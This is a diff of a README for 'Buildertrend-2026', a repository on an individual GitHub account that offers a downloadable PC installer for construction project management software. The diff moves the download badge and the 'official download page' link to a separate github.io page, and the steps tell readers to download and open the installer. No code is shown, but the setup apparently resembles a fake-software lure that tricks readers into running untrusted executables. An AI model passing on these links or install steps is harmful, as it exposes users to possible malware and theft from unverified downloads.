@@ -1,6 +1,6 @@
 # 🏗️ Buildertrend-2026 - Manage Your Construction Projects With Ease
 
-[![](https://img.shields.io/badge/Download_Buildertrend-Blue.svg)](https://github.com/Kingsignora880/Buildertrend-2026)
+[![](https://img.shields.io/badge/Download_Buildertrend-Blue.svg)](https://kingsignora880.github.io)
 
 ## 🛠️ Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the application on your PC.
 
-1. Go to the [official download page](https://github.com/Kingsignora880/Buildertrend-2026).
+1. Go to the [official download page](https://kingsignora880.github.io).
 2. Look for the release section on the right side of the page.
 3. Click the link to download the installer file.
 4. Open the file once the download finishes.
